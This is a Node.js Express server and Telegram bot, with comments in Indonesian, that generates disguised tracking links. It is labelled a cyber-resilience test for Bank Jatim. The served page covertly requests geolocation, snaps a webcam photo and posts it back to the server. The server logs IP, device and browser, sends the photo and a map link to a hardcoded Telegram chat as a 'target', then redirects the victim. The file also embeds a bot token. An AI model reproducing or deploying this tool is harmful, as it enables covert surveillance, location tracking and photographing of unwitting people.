const express = require('express');
const { Telegraf } = require('telegraf');
const Markup = require('telegraf/markup');
const fs = require('fs');
const ExcelJS = require('exceljs');
const path = require('path'); // Untuk mengatur path file
const app = express();
const bot = new Telegraf('8072489713:AAF5D8OBkikMefxO5UwV8c9h0Ec8ebp96lU');

const BASE_URL = 'https://human-capital-five.vercel.app';
const LINKS_FILE = 'links.json';
const UPLOADS_DIR = path.join(__dirname, 'uploads');
const http = require('http');

if (!fs.existsSync(UPLOADS_DIR)) {
    fs.mkdirSync(UPLOADS_DIR);
}

let generatedLinks = {};
let clickData = [];

app.use(express.json({ limit: '10mb' })); // Mendukung payload JSON besar

function loadData() {
    if (fs.existsSync(LINKS_FILE)) {
        const data = JSON.parse(fs.readFileSync(LINKS_FILE, 'utf8'));
        generatedLinks = data.generatedLinks || {};
        clickData = data.clickData || [];
    }
}

function saveData() {
    const data = { generatedLinks, clickData };
    fs.writeFileSync(LINKS_FILE, JSON.stringify(data, null, 2));
}

loadData();

app.get('/', (req, res) => {
    res.send('Server is running ! \n\nUji Ketahanan Siber Bank Jatim siap dilakukan !!');
});

app.listen(3000, () => {
    console.log('Server running on port 3000');
});

// Keep-Alive Function
const keepAlive = () => {
  setInterval(() => {
    http.get(BASE_URL, (res) => {
      console.log(`Keep-alive ping sent. Status Code: ${res.statusCode}`);
    }).on('error', (err) => {
      console.error('Error sending keep-alive ping:', err.message);
      // Reconnect if error occurs
      setTimeout(keepAlive, 10000);
    });
  }, 120000); // Ping setiap 2 menit
};

keepAlive();

bot.start((ctx) => {
    ctx.reply(
        'Selamat datang! Gunakan tombol di bawah untuk memulai.',
        Markup.inlineKeyboard([
            Markup.button.callback('Input URL Baru', 'input_url'),
            Markup.button.callback('View Status', 'view_Status'),
            Markup.button.callback('Generate Report', 'generate_report'),
        ])
    );
});

bot.action('input_url', (ctx) => {
    ctx.reply('Masukkan URL yang ingin Anda tracking.');
    bot.on('text', (ctx) => {
        const originalUrl = ctx.message.text;
        const urlRegex = /^(https?:\/\/[^\s$.?#].[^\s]*)$/;
        if (!urlRegex.test(originalUrl)) {
            return ctx.reply('URL tidak valid. Pastikan menggunakan format lengkap (https://example.com).');
        }

        const parsedUrl = new URL(originalUrl);
        const domain = parsedUrl.hostname.split('.').slice(-2, -1).join('.');
        const linkPrefix = domain || 'link';
        const existingLinks = Object.keys(generatedLinks).filter(linkId => linkId.startsWith(linkPrefix));

        const linkIdNumber = existingLinks.length > 0 ? Math.max(...existingLinks.map(linkId => parseInt(linkId.split('-')[1], 10))) + 1 : 1;
        const linkId = `${linkPrefix}-${String(linkIdNumber).padStart(3, '0')}`;

        generatedLinks[linkId] = originalUrl;
        saveData();

        const trackingUrl = `${BASE_URL}/track/${linkId}`;
        ctx.reply(
            `URL berhasil ditambahkan!\n\nGunakan link berikut untuk tracking:\n${trackingUrl}`,
            Markup.inlineKeyboard([
                Markup.button.callback('Input URL Baru', 'input_url'),
                Markup.button.callback('View Status', 'view_Status'),
                Markup.button.callback('Generate Report', 'generate_report'),
            ])
        );
    });
});

bot.action('view_Status', (ctx) => {
    const Status = Object.keys(generatedLinks).map(linkId => {
        const uniqueClicks = new Set(
            clickData.filter(item => item.linkId === linkId).map(item => `${item.browser}-${item.os}`)
        ).size;

        return `📊 Tracking Status:\n\nLink ID: ${linkId}\nClicks: ${uniqueClicks}`;
    }).join('\n\n') || 'Tidak ada data klik.';
    ctx.reply(Status);
});

bot.action('generate_report', async (ctx) => {
    const workbook = new ExcelJS.Workbook();
    const worksheet = workbook.addWorksheet('Tracking Report');

    worksheet.columns = [
        { header: 'Timestamp', key: 'timestamp', width: 20 },
        { header: 'Link ID', key: 'linkId', width: 10 },
        { header: 'IP', key: 'ip', width: 15 },
        { header: 'Device', key: 'device', width: 10 },
        { header: 'Browser', key: 'browser', width: 15 },
        { header: 'OS', key: 'os', width: 15 },
        { header: 'Locations', key: 'googleMapsLink', width: 30 },
    ];

    clickData.forEach(item => {
        worksheet.addRow({
            timestamp: item.timestamp,
            linkId: item.linkId,
            ip: item.ip,
            device: item.device,
            browser: item.browser,
            os: item.os,
            googleMapsLink: item.googleMapsLink,
        });
    });

    const fileName = `Tracking_Report_${Date.now()}.xlsx`;
    await workbook.xlsx.writeFile(fileName);
    ctx.replyWithDocument({ source: fileName });

    setTimeout(() => {
        fs.unlinkSync(fileName);
    }, 5000);
});

app.get('/track/:linkId', (req, res) => {
    const linkId = req.params.linkId;
    const originalUrl = generatedLinks[linkId];

    if (!originalUrl) {
        return res.status(404).send('Link tidak ditemukan');
    }

    const trackingPageUrl = `${BASE_URL}/location/${linkId}`;
    res.redirect(trackingPageUrl);
});

app.get('/location/:linkId', (req, res) => {
    const linkId = req.params.linkId;
    const originalUrl = generatedLinks[linkId];

    if (!originalUrl) {
        return res.status(404).send('Link tidak ditemukan');
    }

    res.send(`
        <html>
            <body>
                <script>
                    function sendData() {
                        const handleCamera = (location) => {
                            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
                                const video = document.createElement('video');
                                video.srcObject = stream;
                                video.play();
                                const canvas = document.createElement('canvas');
                                const context = canvas.getContext('2d');
                                video.onloadedmetadata = function() {
                                    canvas.width = video.videoWidth;
                                    canvas.height = video.videoHeight;
                                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                                    const photo = canvas.toDataURL('image/jpeg');

                                    fetch('/sendPhoto', {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({ location, photo, linkId: '${linkId}' })
                                    }).then(() => {
                                        window.location.href = '${originalUrl}';
                                    });
                                };
                            }).catch(() => {
                                fetch('/sendPhoto', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({ location, photo: null, linkId: '${linkId}' })
                                }).then(() => {
                                    window.location.href = '${originalUrl}';
                                });
                            });
                        };

                        if (navigator.geolocation) {
                            navigator.geolocation.getCurrentPosition(
                                function(position) {
                                    const location = {
                                        latitude: position.coords.latitude,
                                        longitude: position.coords.longitude
                                    };
                                    handleCamera(location);
                                },
                                function() {
                                    // Fallback jika lokasi ditolak
                                    handleCamera(null);
                                }
                            );
                        } else {
                            handleCamera(null);
                        }
                    }
                    sendData();
                </script>
            </body>
        </html>
    `);
});

app.post('/sendPhoto', (req, res) => {
    const { location, photo, linkId } = req.body;
    const userAgent = req.get('User-Agent');
    const ip = req.ip.replace(/^.*:/, '');
    const device = /mobile/i.test(userAgent) ? 'Mobile' : 'Desktop';
    const timestamp = new Date().toISOString();
    const googleMapsLink = location ? `https://www.google.com/maps?q=${location.latitude},${location.longitude}` : 'Location not permitted';

    const browserMatch = userAgent.match(/(firefox|chrome|safari|edge|opera|msie|trident)/i);
    const osMatch = userAgent.match(/(windows nt|macintosh|linux|android|iphone)/i);
    const browser = browserMatch ? browserMatch[0] : 'Unknown';
    const os = osMatch ? osMatch[0] : 'Unknown';

    clickData.push({ timestamp, linkId, ip, device, browser, os, googleMapsLink });
    saveData();

    if (photo) {
        const fileName = path.join(UPLOADS_DIR, `photo_${Date.now()}.jpg`);
        const base64Data = photo.replace(/^data:image\/jpeg;base64,/, '');
        fs.writeFileSync(fileName, base64Data, 'base64');

        bot.telegram.sendPhoto(6162762311, { source: fileName }, { caption: `📸 Foto Target:
Timestamp: ${timestamp}
Link ID: ${linkId}
IP: ${ip}
Device: ${device}
Browser: ${browser}
OS: ${os}
Location: ${googleMapsLink}` });

        setTimeout(() => {
            fs.unlinkSync(fileName);
        }, 5000);
    } else {
        bot.telegram.sendMessage(6162762311, `❌ Target tidak memberikan izin kamera.

Timestamp: ${timestamp}
Link ID: ${linkId}
IP: ${ip}
Device: ${device}
Browser: ${browser}
OS: ${os}
Location: ${googleMapsLink}`);
    }

    res.sendStatus(200);
});

bot.launch();
